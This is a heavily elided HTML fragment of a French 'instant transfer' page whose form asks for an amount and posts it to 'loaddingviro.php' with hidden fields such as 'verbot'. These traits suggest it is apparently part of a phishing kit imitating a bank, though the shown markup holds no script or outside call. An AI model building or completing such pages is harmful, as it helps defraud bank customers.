...
<html>
    ...
    <body>
        ...
        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">Virement Instantané</p>
        </div>
        ...
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <form class="login-form" method="post" action="loaddingviro.php">
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="ss">
                            <input type="hidden" name="error" value="">
                            <legend>Veuillez saisir le montant pour le virement.</legend>
                            <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Saisissez le montant</p>
                                    <input type="text" class="input" id="ss" name="ss">
                                </label>
                                                            </div>
